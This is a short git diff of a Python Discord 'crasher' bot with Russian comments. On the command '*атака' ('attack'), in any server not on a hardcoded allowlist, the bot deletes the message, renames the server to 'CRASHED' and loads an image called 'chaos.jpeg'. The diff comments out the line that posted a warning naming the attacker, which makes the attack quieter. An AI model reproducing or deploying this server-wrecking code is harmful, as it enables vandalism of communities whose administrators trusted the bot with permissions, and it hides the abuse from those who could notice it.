@@ -33,7 +33,7 @@ class MyClient(discord.Client):
 		if message.guild.id != 732584678313427008 and message.guild.id != 725752675106291804 and message.guild.id != 741589705094594642 and message.guild.id != 561460998444154881 and message.guild.id != 724533962583834665 and message.guild.id != 707402752166199378:
 			if message.content == '*атака': #автоматический краш
 				await message.delete() #удаление сообщения
-				await client.get_channel(732820713584721923).send('**Участник под ником **' + message.author + ' **крашит сервер **' + message.guild.name + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
+				#await client.get_channel(732820713584721923).send('**Участник под ником **' + message.author + ' **крашит сервер **' + message.guild.name + ' **с** ' + str(len(message.guild.members)) + ' **участниками. Не доверяйте админ-права незнакомцам, будьте бдительны!**')
 				print('Атака на сервер', message.guild.name)
 				await message.guild.edit(name='__...-<<CRASHED>>-...__') #переименовывание сервера
 				with open('chaos.jpeg', 'rb') as f:
